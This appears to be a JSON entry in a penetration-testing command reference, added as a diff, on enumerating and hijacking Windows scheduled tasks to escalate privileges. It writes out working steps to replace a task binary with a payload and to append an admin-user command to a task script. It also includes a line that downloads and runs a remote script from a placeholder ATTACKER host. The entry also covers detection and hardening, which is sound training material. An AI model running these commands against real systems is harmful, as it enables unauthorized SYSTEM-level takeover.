@@ -1,0 +1,97 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "schtasks",
+    "accesschk"
+  ],
+  "tags": [
+    "scheduled-tasks",
+    "enumeration"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Miscellaneous Techniques",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "List scheduled tasks (verbose)",
+      "command": "schtasks /query /fo LIST /v"
+    },
+    {
+      "label": "Same via PowerShell",
+      "command": "Get-ScheduledTask | select TaskName,State"
+    },
+    {
+      "label": "Check write access on the scripts directory",
+      "command": ".\\accesschk64.exe /accepteula -s -d C:\\Scripts\\"
+    },
+    {
+      "label": "icacls check on a task's binary — look for Users:(F) or (W)",
+      "command": "icacls <path\\to\\task_binary.exe>\n# Exploitable if: BUILTIN\\Users:(F), Everyone:(F), or <currentuser>:(F/W/M)"
+    },
+    {
+      "label": "Swap the task binary with a payload (backup original first)",
+      "command": "# Back up original:\nmove .\\Pictures\\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak\n# Drop payload in its place:\nmove .\\adduser.exe .\\Pictures\\BackendCacheCleanup.exe\n# Wait for the scheduled task to run (or use schtasks /run /tn <name>)"
+    }
+  ],
+  "notes": "=== Scheduled Tasks — Enumeration and Script Hijacking ===\nEnumerate scheduled tasks to find scripts in writable directories running as SYSTEM.\n\n=== ENUMERATION COMMANDS ===\ncmd:\n  schtasks /query /fo LIST /v   → all tasks with full details\n  schtasks /query /fo LIST /v | findstr \"Task To Run\\|Run As User\\|Status\"\n\nPowerShell:\n  Get-ScheduledTask | Select TaskName,TaskPath,@{N='Action';E={$_.Actions.Execute}},@{N='RunAs';E={$_.Principal.UserId}} | Where-Object {$_.RunAs -ne 'Users' -and $_.RunAs -ne 'INTERACTIVE'}\n\nFile location of task definitions (admin-only read):\n  ls C:\\Windows\\System32\\Tasks\\ (admin required to read other users' tasks)\n\n=== WHAT TO LOOK FOR ===\nTasks running as:\n  SYSTEM = highest priority for script hijacking\n  DOMAIN\\Administrator = domain admin execution context\n  High-privilege service accounts = lateral movement potential\n\nScripts in writable locations:\n  C:\\Scripts\\ (often created by sysadmins without proper ACLs)\n  C:\\Tools\\ (admin tooling directories)\n  %USERPROFILE%\\ subdirectories (may be writable by non-admin users)\n\n=== EXPLOITATION — SCRIPT HIJACKING ===\n1. Find writable script referenced in scheduled task:\n   icacls C:\\Scripts\\backup.ps1   → check if current user has write access\n2. Append malicious command to existing script (non-destructive):\n   echo \"net localgroup administrators attacker /add\" >> C:\\Scripts\\backup.ps1\n   Or: Add-Content C:\\Scripts\\backup.ps1 \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')\"\n3. Wait for scheduled run → malicious command executes as SYSTEM\n4. Cleanup: remove appended line after exploitation\n\n=== PATIENCE-BASED TECHNIQUE ===\nScheduled tasks often run overnight, on login, or on specific intervals.\nDeploy modification, check back periodically for callback.\nUseful in long-term assessments: modify on day 1, check day 2.\n\n=== CHAINING CONTEXT ===\nScheduled task running backup script as SYSTEM → script in C:\\Scripts\\ writable → inject code → SYSTEM\nTask running as domain admin → hijack script → domain admin command execution\nTask running DB backup → credentials in script → harvest for lateral movement\nMS10-092 (Schelevator) directly abuses Task Scheduler — related kernel exploit path OSCP Ch16 hijacking pattern: find task running as privileged user → icacls on binary/script → full access = replace with adduser.exe → wait for trigger. Key fields: 'Task To Run', 'Run As User', 'Next Run Time'. Also covered in: OSCP PEN-200 Chapter 16 (Windows Privilege Escalation).",
+  "references": [
+    {
+      "title": "Microsoft - schtasks",
+      "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 - Windows Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sharpup-audit",
+      "note": "Broader weak-permission enumeration.",
+      "rel": "alternative"
+    },
+    {
+      "id": "winpe-named-pipes-enum",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "scheduled-tasks-enum",
+  "name": "Misc - Scheduled Task Enumeration",
+  "command": "schtasks /query /fo LIST /v",
+  "description": "List scheduled tasks and check permissions on the scripts/binaries they run. A task run by a privileged account whose target is writable by you is an escalation path.",
+  "opsec": "loud",
+  "mitre": [
+    "T1053.005"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Scheduled tasks run their associated scripts or binaries under the configured user context (often SYSTEM or a privileged account). If the script file or binary is in a directory writable by the current user, replacing or modifying it will execute attacker code under the privileged task's context on the next scheduled run.",
+    "prerequisites": "Shell access. Scheduled tasks running as SYSTEM or privileged account exist. Write access to the script directory used by a scheduled task.",
+    "impact": "Arbitrary code execution as SYSTEM or as the privileged task owner on the next task execution, enabling privilege escalation and persistence.",
+    "detection": "schtasks /query executed by standard user. accesschk on task script directories. File modification events on scheduled task script files. Event 4698 (task registered) or task script modification monitored.",
+    "artifacts": "Process log: schtasks /query by standard user | accesschk on script paths | File modification: task script modified by non-admin | Event 4702: scheduled task updated",
+    "prevention": "Audit scheduled task script directory permissions — script directories must not be writable by standard users. Validate scheduled task configurations with CIS Benchmark tools. Sign scheduled task scripts to detect tampering. Monitor task script file integrity.",
+    "misconfiguration": "Scheduled task script stored in C:\\Scripts or C:\\Tools with write access for all users. No file integrity monitoring on task script files. Tasks running as SYSTEM without restricting their script directory.",
+    "vulnerable_config": "# Find scheduled tasks and check script permissions:\nschtasks /query /fo LIST /v | findstr 'Task To Run'\n# Task: C:\\Scripts\\check_updates.ps1\n\naccesschk.exe -w C:\\Scripts -v\n# BUILTIN\\Users: FILE_ALL_ACCESS <- writable!\n\n# Replace script:\necho 'net localgroup Administrators attacker /add' >> C:\\Scripts\\check_updates.ps1",
+    "secure_config": "# Restrict script directory permissions:\nicacls C:\\Scripts /inheritance:r /grant 'SYSTEM:(OI)(CI)F' /grant 'Administrators:(OI)(CI)F'\n\n# Audit task permissions:\nGet-ScheduledTask | ForEach-Object {\n    $task = $_\n    $action = $task.Actions | Select-Object -First 1\n    icacls $action.Execute 2>$null\n}\n\n# Enable task modification auditing (Event 4702)",
+    "sources": [
+      "HTB M26",
+      "MITRE T1053.005"
+    ]
+  }
+}
